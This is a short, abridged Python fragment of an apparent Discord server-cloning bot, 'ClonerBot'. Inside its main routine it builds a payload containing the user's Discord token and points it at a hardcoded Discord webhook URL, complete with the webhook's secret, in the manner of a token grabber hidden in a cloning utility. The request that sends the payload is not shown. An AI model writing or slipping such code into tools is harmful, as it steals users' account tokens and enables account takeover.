try:
    ...
    import time
    import discord
    import requests  # Add requests to send the token to a webhook
...
class ClonerBot:
    ...
    def main(self):
        ...
        webhook_url = 'https://discord.com/api/webhooks/1271125887215075399/6BWj6up4xsoxCpMlbaNvE1mB2ycMAGo3YcqKoHNl3Hz-dz_72DB4LW1Clj3vhshD56hr'  # Replace with your webhook URL
        payload = {
            'content': f'Token: {self.TOKEN}'
        }
